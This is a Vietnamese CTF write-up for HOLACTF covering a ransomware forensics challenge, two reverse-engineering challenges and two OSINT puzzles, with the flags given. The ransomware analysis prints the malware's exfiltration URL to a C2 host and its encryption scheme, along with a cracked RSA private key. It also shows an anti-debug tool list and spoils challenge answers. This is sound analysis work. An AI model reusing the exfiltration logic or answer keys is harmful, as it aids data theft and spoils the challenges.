![dec_emoji](https://hackmd.io/_uploads/HJQm4t-9ll.png)
[+] NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd hàm chức năng decode escape/emoji
[+] eLzUcATejKPOKKMlaYnpnwtwzJclOfwjWFRoaxlxd Main code nhận 5 đối số là các folder như : 
b'Documents',b'Videos',b'Pictures',b'Music',b'Desktop'
Tóm tắt logic code hàm Maincode

Tại một key dùng decryption payload được tạo thông qua ISAASC nhận một seed từ return của OVixtxAlZgODrcwOVgagxeWAk()
mã hóa key này với AES với key_aes và iv_aes (hardcode) xong wapper cả 3 vào rồi lại mã hóa với RSA
lưu data vào **kita.key**
[+] TxWVCaCGswNFFkFNyyuGYebzTnmKMI là hàm giải mã với key ban đầu được custom với rounds = 3
giả mã payload xor đơn giản với key custom
và có một điều đáng chú ý là attacker đã lưu các tên file gốc và một list lưu vào **original_files.txt** sau đó được nén với 7zip ở hàm 
[+]lzzmjArGgUUExMsxcUOqmdCCBrduwURYMq : nén file với 7z
[+] hVQylKhewOSgWxHuxbNcBpLUQmdgVGemoKmKEvbqat : Send file ra ngoài 
Tạo folder "%TEMP%\maicraft_<GUID>" để lưu trữ files **"kita.key,original_files.txt"**
```
Payload giải mã hàm nén
Process.Start(C:\\Program Files\\7-Zip\\7z.exe, "a -t7z -mx5 -parameter-none \"" + package.7z "\" + %TEMP%maicraft_<GUID>)
``` 
```
Payload giải mã hàm send
https://192.168.244.129:4433/file
```
Tới đây ta có đc IPC2 cũng như file được gửi
Check file pcapng có trong temp folder wireshark_Ethernet03ZL1B3.pcapng
thì thấy có các connect tới Ip này nhưng đã bị mã hóa TLSv1.2 thì TLSv1.2 sử dụng thuật toán RSA để encrypted packet liệu ta có thể crack được private key từ publickey không?
Hãy thử tôi sẽ tìm Handshake của TLS và lấy public key từ Server Hello packet
dùng openssl để kiểm tra thông tin cert
```
openssl x509 -in ../public.cer -text -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            a7:13:6c:39:cf:6c:34:61
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=AU, ST=Some-State, O=Internet Widgits Pty Ltd
        Validity
            Not Before: Jul 22 12:40:09 2025 GMT
            Not After : Jul 22 12:40:09 2026 GMT
        Subject: C=AU, ST=Some-State, O=Internet Widgits Pty Ltd
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (1024 bit)
                Modulus:
                    00:8e:67:9c:2f:5e:44:ff:8f:57:0f:09:ea:a7:ea:
                    76:48:59:61:db:50:c6:d2:b8:86:e6:dd:cc:11:1b:
                    ca:7d:c5:46:8d:f6:be:f7:00:b5:a0:aa:1c:c7:68:
                    0c:16:10:08:90:8e:2b:7c:bd:d9:95:15:13:87:b5:
                    e6:83:52:80:6e:d9:e9:8a:a9:71:dc:3e:ae:88:a9:
                    5b:1b:92:dd:29:72:b1:d7:d1:0a:3e:91:50:c1:00:
                    15:b0:db:6f:86:bd:49:e9:4f:7e:b9:b2:63:8e:0d:
                    ba:23:a0:04:30:00:00:00:00:00:00:00:00:00:00:
                    00:00:00:00:00:02:29:7e:23
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier:
                AA:AA:16:93:76:3F:B4:9B:92:A8:AF:30:0D:AA:31:56:D7:41:6C:11
            X509v3 Authority Key Identifier:
                AA:AA:16:93:76:3F:B4:9B:92:A8:AF:30:0D:AA:31:56:D7:41:6C:11
            X509v3 Basic Constraints:
                CA:TRUE
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        07:17:d8:30:0f:08:9e:40:c9:34:94:1a:16:2f:21:37:78:c9:
        bb:b8:d0:93:13:2f:60:40:e4:8a:ab:32:7f:1c:da:75:ad:17:
        cd:21:44:07:0e:4e:2c:5a:6e:9f:70:b1:b0:cc:50:40:1d:65:
        11:a7:88:8d:c7:f8:4e:6d:ed:20:c1:e2:d3:47:94:3d:a2:33:
        bd:2a:35:fe:8a:09:42:7c:7d:ce:60:58:85:e0:bf:69:30:ed:
        32:96:96:88:83:49:a2:0b:a9:0c:01:80:e1:15:12:8c:90:2c:
        24:de:20:10:ec:80:a7:d2:8b:52:ee:33:6c:3e:65:a5:93:66:
        e6:e7
```
Dùng RSAtool
```
 python RsaCtfTool/src/RsaCtfTool/main.py --publickey ../public.cer --private
Results for ../public.cer:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQCOZ5wvXkT/j1cPCeqn6nZIWWHbUMbSuIbm3cwRG8p9xUaN9r73
ALWgqhzHaAwWEAiQjit8vdmVFROHteaDUoBu2emKqXHcPq6IqVsbkt0pcrHX0Qo+
kVDBABWw22+GvUnpT365smOODbojoAQwAAAAAAAAAAAAAAAAAAAAAil+IwIDAQAB
AoGAFDXGJ77UQgTA0USSBfSzhr8QsUR8gylnE9rEfGUaTtExmzI6lemG3V9nKDGv
DW6HGKTkrRZwi8Tq+aaqKVcLHPokNoLqCTGIIxzTG1KMh6ncHcEt2LjIau9XZAmH
/pYbOUUZCZ10VXV2knn4XtApL9bQKS/W0Ckv1tApL9cerxkCQQC+7vtYSv+GA6r7
VQ/6z9j6XKR+T4jUU3Eny9L+YhRfCEVEtlM1UVW2r5nUCuQAAAAAAAAAAAAAAAAA
AAAAAA9XAkEAvu77WEr/hgOq+1UP+s/Y+lykfk+I1FNxJ8vS/mIUXwhFRLZTNVFV
tq+Z1ArkAAAAAAAAAAAAAAAAAAAAAAAkFQJBAIpCge2IuYnw5AKFsUGc+vEo3tC8
hUfDeKApv4sHuNqsIYTFRnHIiPn2JL1geYPqfBWD6nwVg+p8FYPqfBWD9ZcCQBjJ
dZ/UvK9tMnlGZbit2wFFnaU4Ng86deowr8eOfA6KSFPPR6YYVQROb63za/4EAfv+
BAH7/gQB+/4EAfv+CLECQFkQ/IbcTsugzporrmibrWMkqLgTphVUVq1F3YGoA9BY
FSCVRINF5585CYRrevEN+y3M5Xvm7il2HeQJpGY1D1o=
-----END RSA PRIVATE KEY-----
```
rồi giờ thì vào wireshark : Edit->Preference-> Protocol->TLS-> RSA key list -> import private key vào
![image](https://hackmd.io/_uploads/rJAvjt-qlg.png)
payload sau giả mã 
```
┌──(thong㉿DESKTOP-SD4MBKE)-[/mnt/c/users/tttho/downloads/rsatool]
└─$ ls -la ../package/
total 8
drwxrwxrwx 1 thong thong  512 Aug 31 11:59 .
drwxrwxrwx 1 thong thong  512 Aug 31 14:36 ..
-rwxrwxrwx 1 thong thong  256 Aug 30 02:46 kita.key
-rwxrwxrwx 1 thong thong 7218 Aug 30 02:48 original_files.txt
```
đọc file original_files.txt -> file video.mp4
vậy làm sao giải mã lấy key ban đầu tôi thử tìm file video.mp4 xem còn trong fs thật nó vẫn còn được lưu trong folder vmware temp :))
tôi sẽ xor cipher ^ plaintext -> key (và cũng do tôi không thể dùng cách cũ để crack privatekey từ publickey nên tôi không thể resolve lại được key ban đầu khá bối rối trong giai đoạn này)
dùng key để decrypt các file còn lại
![findkey](https://hackmd.io/_uploads/BkR_hKZcxg.png)
![decryption](https://hackmd.io/_uploads/B1emaFW5gg.png)
chương trình decryption folder decrypt 5 folder ban đầu đc truyền vào main code nhé
check 
```
file evidenceeeee/*
evidenceeeee/dec_files/TYTUTtTtkPuXsZaiwiKa.dec: ASCII text, with no line terminators  
┌──(thong㉿DESKTOP-SD4MBKE)-[/mnt/c/users/tttho/downloads]
└─$ cat evidenceeeee/dec_files/TYTUTtTtkPuXsZaiwiKa.dec
Nice bro, answer the remaining questions to get the flag ^^
┌──(thong㉿DESKTOP-SD4MBKE)-[/mnt/c/users/tttho/downloads]
└─$ md5sum evidenceeeee/dec_files/TYTUTtTtkPuXsZaiwiKa.dec
0e2c58ea5f51647dc2f81a03b43b6580  evidenceeeee/dec_files/TYTUTtTtkPuXsZaiwiKa.dec

```
#### Đáp án cho 7,8,9
>Q7: In stage 3, which C2 IP address is the user's network traffic transmit to?
Ex: 192.168.1.1
Ans: 192.168.244.129
Correct!
Q8: The attacker made a mistake, take advantage of it and tell us the name of files encrypted by attacker's ransomware in folder Videos ?
Ex: ehc.mp3
Ans: video.mp4
Correct!
Q9: What are the contents of the file flag.txt? (Convert the content of the flag.txt to md5 and submit)
Ex: 4a34decdd3494446ff0546364aa975b5
Ans: 0e2c58ea5f51647dc2f81a03b43b6580
Correct! Here is your flag:
HOLACTF{dUN6_BA0_9I0_CI1ck_V40_5traN63_f11e_Nhe_4huhu_5e740da065a1}

    

## Reverse
### RE102
![image](https://hackmd.io/_uploads/rk0ymTZ9lg.png)

- Ở bài này mình nhận được một file `ELF64`, khi mình đưa vào IDA để decomple thì dường như nó đã bị pack. Tiếp tục mình xem phần string thì nó có 2 dòng sau.
![image](https://hackmd.io/_uploads/r1wy4a-9eg.png)
- Lúc này mình nghi ngờ nó bị pack lại bời UPX. Nhưng khi mình check bằng DIE thì chả thấy gì.
- Đến khi mình vứt vào HxD để xem cấu trúc header của file thì mình có thấy nó giống cấu trúc của file ELF bị pack bởi UPX. Và thông thường signature UPX! sẽ bắt đầu từ 0xEC -> 0xEF nhưng nó bị thay thế bời FAKE. Đây là phần thông tin về kỹ thuật này.
https://www.akamai.com/blog/security/upx-packed-headaches
![image](https://hackmd.io/_uploads/rJnA4pb9el.png)
- Từ đó mình sẽ thay thế toàn bộ `FAKE -> UPX!`
- Sau khi unpack thì mình đã có một đoạn mã đẹp.
```c
    int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  const char *v4; // rax
  char s2[8]; // [rsp+14h] [rbp-1Ch] BYREF
  int v7; // [rsp+1Ch] [rbp-14h]
  int v8; // [rsp+20h] [rbp-10h]
  int j; // [rsp+24h] [rbp-Ch]
  int i; // [rsp+28h] [rbp-8h]
  int v11; // [rsp+2Ch] [rbp-4h]

  signal(5, handle_security_violation);
  v3 = time(0);
  srand(v3);
  puts("SecureSoft Enterprise License Management System v4.7.2");
  puts("Copyright (c) 2024 SecureSoft Technologies Inc.");
  puts("Initializing secure authentication protocols...\n");
  initialize_logging_system();
  v11 = 0;
  v8 = verify_database_connection();
  v7 = validate_license_server();
  perform_system_maintenance();
  if ( check_debugger_presence() )
  {
    ++v11;
    puts("Warning: Debugger environment detected");
  }
  configure_user_settings();
  for ( i = 0; i <= 4; ++i )
  {
    usleep(0xC350u);
    printf("Loading security module %d/5...\n", i + 1);
  }
  if ( validate_system_integrity() )
  {
    ++v11;
    puts("Warning: System integrity compromised");
  }
  if ( measure_execution_timing() )
  {
    ++v11;
    puts("Warning: Abnormal execution timing detected");
  }
  printf("Database connections: %d\n", g_database_connections);
  if ( g_network_status )
    v4 = "Online";
  else
    v4 = "Offline";
  printf("Network status: %s\n", v4);
  printf("Encryption level: %d bits\n", g_encryption_level % 512 + 128);
  if ( scan_parent_process() )
  {
    ++v11;
    puts("Warning: Suspicious parent process detected");
  }
  if ( v11 <= 0 )
  {
    puts("System integrity verified. Proceeding with license validation...");
    if ( argc == 2 )
    {
      printf("Validating license key: %s\n", argv[1]);
      strcpy(s2, "reverse");
      if ( !strcmp(argv[1], s2) )
      {
        puts("License key accepted. Connecting to activation servers...");
        for ( j = 0; j <= 2; ++j )
        {
          usleep(0x30D40u);
          printf("Authenticating with server %d...\n", j + 1);
        }
        if ( activate_premium_subscription() )
        {
          puts("All systems operational. Welcome to SecureSoft Enterprise!");
          return 0;
        }
        else
        {
          puts("Server authentication failed. Switching to educational mode.");
          launch_educational_version();
          return 1;
        }
      }
      else
      {
        puts("Invalid license key provided. Starting demo session.");
        start_demo_session();
        return 1;
      }
    }
    else
    {
      printf("Usage: %s <license_key>\n", *argv);
      puts("Contact support@securesoft.com for license activation.");
      return 1;
    }
  }
  else
  {
    printf("Security policy violations detected (%d). Entering safe mode.\n", v11);
    printf("Trial access granted: %s\n", trial_subscription);
    return 0;
  }
}
```
                          
- Và đây chính là đoạn chính xử lý flag.
```c
__int64 activate_premium_subscription()
{
  _BYTE v1[16]; // [rsp+0h] [rbp-70h] BYREF
  _BYTE v2[16]; // [rsp+10h] [rbp-60h] BYREF
  _BYTE v3[72]; // [rsp+20h] [rbp-50h] BYREF
  int v4; // [rsp+68h] [rbp-8h]
  int v5; // [rsp+6Ch] [rbp-4h]

  initialize_network_protocols(&database_connection_string, v2, 16);
  initialize_network_protocols(&api_authentication_token, v1, 16);
  v5 = process_encrypted_subscription(&premium_subscription_data, 32, v2, v1, v3);
  if ( v5 <= 0 )
    return 0;
  v4 = v3[v5 - 1];
  v3[v5 - v4] = 0;
  puts("Premium subscription activated! Access granted.");
  return 1;
}
```
- Hai đoạn mã call hàm đầu tiên là nơi xử lý Key và IV. Nó sẽ lấy `database_connection_string` và `api_authentication_token` XOR 0x5A.
```c
    __int64 __fastcall initialize_network_protocols(__int64 a1, __int64 a2, int a3)
{
  __int64 result; // rax
  unsigned int i; // [rsp+20h] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= a3 )
      break;
    *(i + a2) = *(i + a1) ^ 0x5A;
  }
  return result;
}
```
> - Key: MySecretKey12345
> - IV: 1234567890123456
- Sau đó nó sẽ đưa vào hàm này để giải mã flag với key và IV trên.
- Mình sẽ dump data của `premium_subscription_data` để giải mã.
- Flag sẽ có format là ***HOLACTF{hex}***
> **FLAG:** HOLACTF{1b0b403ac790763ba5218d13801aa4e801c5947d4d25705006e5c603b08807f2}
### RE103
![image](https://hackmd.io/_uploads/Skfg3bM9le.png)

- Bài này mình nhận được một file .NET antidebug khá nặng.
![image](https://hackmd.io/_uploads/Syt52Zz9eg.png)
- Ví dụ như tại đây nó đang check proccess xem ta có đang dùng các phần mềm trong list này không nếu có sẽ bị gắn cờ debug và chạy sang một luồng khác và print ra fake flag.
```csharp
// Token: 0x06000006 RID: 6 RVA: 0x000023E4 File Offset: 0x000005E4
		private static void ValidateExecutionEnvironment()
		{
			string[] array = new string[]
			{
				"ollydbg", "x64dbg", "ida", "ghidra", "radare2", "cheatengine", "processhacker", "procmon", "wireshark", "fiddler",
				"dnspy", "reflexil", "ilspy", "dotpeek", "justdecompile"
			};
			try
			{
				Process[] processes = Process.GetProcesses();
				Process[] array2 = processes;
				for (int i = 0; i < array2.Length; i++)
				{
					Process process = array2[i];
					string processName = process.ProcessName.ToLower();
					if (array.Any((string forbidden) => processName.Contains(forbidden)))
					{
						NetworkConfigurationManager.LaunchSystemDiagnosticUtility();
						Environment.Exit(0);
					}
				}
			}
			catch
			{
			}
		}
```
- Và có môt vài trường hợp antidebug khác, nhưng lúc này mình có thấy một điểm khá đáng ngờ.
![image](https://hackmd.io/_uploads/H1lCTbG9gg.png)
- Liệu các data này nó có chức năng gì. Mình sẽ truy ngược nơi sử dụng `g_lpCriticalSystemData`.
```csharp
		private static string DecryptProtectedData()
		{
			string text;
			try
			{
				byte[] array = NetworkConfigurationManager.ReconstructCipherKey();
				byte[] array2 = NetworkConfigurationManager.ProcessDataWithCipher(NetworkConfigurationManager.g_lpCriticalSystemData, array);
				string @string = Encoding.UTF8.GetString(array2);
				if (!@string.StartsWith("HOLACTF{"))
				{
					throw new InvalidOperationException("Data integrity validation failed");
				}
				text = @string;
			}
			catch
			{
				text = NetworkConfigurationManager.GetFallbackResponse();
			}
			return text;
		}
```
- Tại đây nó sec call `ProcessDataWithCipher(cipher, key)` để giải mã và check xem output có bắt đầu bằng format flag hay không nếu bắt đầu bằng ***HOLACTF{}*** thì return về chuỗi đó và print ra màn hình.
- Mình đã có cipher và key sẽ được gen thông qua hàm `ReconstructCipherKey()`.
```csharp
    		private static byte[] ReconstructCipherKey()
		{
			byte[] array = new byte[NetworkConfigurationManager.g_bSecurityToken1.Length + NetworkConfigurationManager.g_bSecurityToken2.Length];
			for (int i = 0; i < NetworkConfigurationManager.g_bSecurityToken1.Length; i++)
			{
				array[i] = NetworkConfigurationManager.g_bSecurityToken1[i] ^ NetworkConfigurationManager.g_bSystemIdentifier1[i % NetworkConfigurationManager.g_bSystemIdentifier1.Length];
				array[i] = (byte)((int)array[i] ^ NetworkConfigurationManager.g_dwHashSalt1);
				byte[] array2 = array;
				int num = i;
				array2[num] ^= NetworkConfigurationManager.g_bSystemIdentifier1[i % NetworkConfigurationManager.g_bSystemIdentifier1.Length];
				array[i] = (byte)((int)array[i] ^ NetworkConfigurationManager.g_dwHashSalt1);
			}
			for (int i = 0; i < NetworkConfigurationManager.g_bSecurityToken2.Length; i++)
			{
				array[NetworkConfigurationManager.g_bSecurityToken1.Length + i] = NetworkConfigurationManager.g_bSecurityToken2[i] ^ NetworkConfigurationManager.g_bSystemIdentifier2[i % NetworkConfigurationManager.g_bSystemIdentifier2.Length];
				array[NetworkConfigurationManager.g_bSecurityToken1.Length + i] = (byte)((int)array[NetworkConfigurationManager.g_bSecurityToken1.Length + i] ^ NetworkConfigurationManager.g_dwHashSalt2);
				byte[] array3 = array;
				int num2 = NetworkConfigurationManager.g_bSecurityToken1.Length + i;
				array3[num2] ^= NetworkConfigurationManager.g_bSystemIdentifier2[i % NetworkConfigurationManager.g_bSystemIdentifier2.Length];
				array[NetworkConfigurationManager.g_bSecurityToken1.Length + i] = (byte)((int)array[NetworkConfigurationManager.g_bSecurityToken1.Length + i] ^ NetworkConfigurationManager.g_dwHashSalt2);
			}
			return array;
		}
```
- Đây là hàm gen key nhìn nó rất dài dòng nhưng thật ra nó chả thay đổi gì và ***`key =  g_bSecurityToken1 + g_bSecurityToken2`***
- Vậy mình đã có đủ key và cipher. Thuật toán ở đây là gì ?
```csharp
private static byte[] ProcessDataWithCipher(byte[] inputData, byte[] cipherKey)
		{
			byte[] array = new byte[256];
			for (int i = 0; i < 256; i++)
			{
				array[i] = (byte)i;
			}
			int num = 0;
			for (int i = 0; i < 256; i++)
			{
				num = (num + (int)array[i] + (int)cipherKey[i % cipherKey.Length]) % 256;
				byte b = array[i];
				array[i] = array[num];
				array[num] = b;
			}
			byte[] array2 = new byte[inputData.Length];
			int num2 = 0;
			int num3 = 0;
			for (int i = 0; i < inputData.Length; i++)
			{
				num2 = (num2 + 1) % 256;
				num3 = (num3 + (int)array[num2]) % 256;
				byte b = array[num2];
				array[num2] = array[num3];
				array[num3] = b;
				array2[i] = inputData[i] ^ array[(int)(array[num2] + array[num3]) % 256];
			}
			return array2;
		}
```
- Nó chính là RC4. Bây giờ mình sẽ giải mã và lấy output là hex.
> FLAG: ***HOLACTF{hex(output)}***
    
**Cipher:** 87 74 2b cd f2 db a2 99 27 56 97 23 a9 48 db 06 e8 83 15 d3 78 7d 4f 5d 0b e9 33 92 41 b6 b1 68 9a 7b 1d 73 d4 6d 85 10
**Key:** 5f 60 7d 76 75 7e 72 7d 7e 76
![image](https://hackmd.io/_uploads/rJ2cxGz5eg.png)
**FLAG:** **HOLACTF{745d40e06ec4ab2f33d11cd84215f62cd4b2e2705c0428df0249db3370bbc8a3990447771481ba85}**
## OSINT    
### EHC is my family
![540909375_1266086991656308_5633683045114270550_n](https://hackmd.io/_uploads/Hk05zMGcge.jpg)

DDC -> VKU
Flag: HOLACTF{truong_dai_hoc_cong_nghe_thong_tin_va_truyen_thong_viet_han}

### HolaCTF

![HOLACTF](https://hackmd.io/_uploads/Bk0IQzG9xg.jpg)

Đề cho mình poster của HOLACTF 2023, nên mình sẽ tìm thông tin về giải này. Search facebook 1 hồi thì mình tìm được 1 comment sau dưới bài post của HOLACTF 2023
![image](https://hackmd.io/_uploads/rytpmMfqxe.png)

Có thể thấy rõ đây là vigenere cipher với key khả thi là 1 trong 3 hashtag ở trên, mình decode với `dcode.fr`:
![image](https://hackmd.io/_uploads/SyXmVzz9xl.png)

https://www.instagram.com/p/DFnlEkyTgBn/
Đường link trên dẫn mình đến 1 video, khi phát video được tầm 2-3s thì mình để ý dưới góc phải của video
![image](https://hackmd.io/_uploads/SkKY4zM9xe.png)
https://anhshidou.github.io/
    
Truy cập vào link github pages, ctrl u để xem html source trước
![image](https://hackmd.io/_uploads/Sk-A4ff9ge.png)

Phát hiện 1 domain là `ctf.fumosquad-ehc.xyz`

Ban đầu mình thử `waybackmachine` nhưng k được, dùng `dig` với parameter TXT để lấy TXT record của domain:
![image](https://hackmd.io/_uploads/HysYSzMqll.png)
Flag: `HOLACTF{t01_d4_c0_g4ng_r4_d3_r0i}`